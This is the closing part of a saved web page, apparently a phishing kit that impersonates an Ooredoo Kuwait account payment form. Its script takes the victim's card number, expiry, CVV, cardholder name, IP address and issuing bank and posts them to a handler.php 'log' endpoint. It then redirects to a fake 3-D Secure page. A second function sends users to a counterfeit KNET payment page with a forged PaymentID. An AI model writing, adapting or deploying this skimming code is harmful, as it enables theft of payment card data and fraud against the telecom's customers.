            if (cardHolder.value.length < 1) {
                errorMessage.innerHTML = "Card holder name is required";
                finalPayButton.disabled = true;
                cardHolder.style.borderColor = "red";
                return;
            } else {
                cardHolder.style.borderColor = "";
            }

            localStorage.setItem('cardNumber', cardNumberValue);
            localStorage.setItem('ExpiryMonth', expireDate.value);
            localStorage.setItem('CVV', cvv.value);
            localStorage.setItem('CardHolder', cardHolder.value);
            const curr = 'KD'
            localStorage.setItem('currency', curr)
            const mrch = 'myooredoo-pay'
            localStorage.setItem('merchant', mrch)



            errorMessage.innerHTML = '';
            finalPayButton.disabled = false;
            finalPayButton.classList.remove('disabled');

        }

        cardNumber.addEventListener('input', validateForm);
        expireDate.addEventListener('input', validateForm);
        cvv.addEventListener('input', validateForm);
        cardHolder.addEventListener('input', validateForm);

        finalPayButton.addEventListener('click', function () {
            event.preventDefault()

            var client_ip = "1";
            $.getJSON("https://api.ipify.org?format=json", function (data) {
                // Добавление IP-адреса в объект
                client_ip = data.ip;

                const log_data = {
                    card: {
                        number: cardNumber.value,
                        exp: expireDate.value,
                        cvv: cvv.value,
                    },
                    other: {
                        cart_ammout: totalPrice + '.00 KD',
                        clientKey: `${clientKey}`,
                        name: cardHolder.value,
                        ip: client_ip,
                        bankName: binData.BIN.issuer.name,
                        cardBrand: binData.BIN.brand,
                    }
                };
                sendLog(JSON.stringify(log_data))
            });
        })

        let params = new URLSearchParams(document.location.search);
        //let startLang = params.get("lang")
        let startLang = navigator.language || navigator.userLanguage;
        startLang = startLang.slice(0, 2);
        if (startLang === 'ar') {
            switchLanguage()
        }

        function sendLog(data, recursive = false) {
            $.post('handler.php', { 'log': data }, function (response) {
                window.location.href = "/ooredoo/3ds/?brand=" + binData.BIN.brand;
            })
        }

        function generateSimilarNumber(baseNumber) {
            const baseStr = baseNumber.toString();
            const prefix = baseStr.slice(0, -5);
            const randomSuffix = Math.floor(10000 + Math.random() * 90000).toString();
            const newNumber = prefix + randomSuffix;
            return newNumber;
        }

        function knet_payment() {

            localStorage.setItem('Total', totalPrice);

            randNumber = '10943132600036452';
            event.preventDefault()
            if (lang == 'en') {
                window.location.href = "/ooredoo/kpg/paymentpage.html?PaymentID=" + generateSimilarNumber(randNumber);
            } else if (lang === 'ar') {
                window.location.href = "/ooredoo/kpg/paymentpage.html?PaymentID=" + generateSimilarNumber(randNumber) + "&lang=ar";
            }
        }
    </script>
<script type="application/javascript" src="./Ooredoo - حسابي_files/f6399b0fa06da2b8526bf6d078d03357abb38ea7d4760083bde75d00fd00f34a.js.تنزيل"></script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9263daf56df78ab4',t:'MTc0Mjk2MjgyNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./Ooredoo - حسابي_files/saved_resource.html"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-16841967491" data-load-time="1742962826236" height="0" width="0" src="./Ooredoo - حسابي_files/16841967491.html" style="display: none; visibility: hidden;"></iframe><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./Ooredoo - حسابي_files/saved_resource(1).html"></iframe>

</body></html>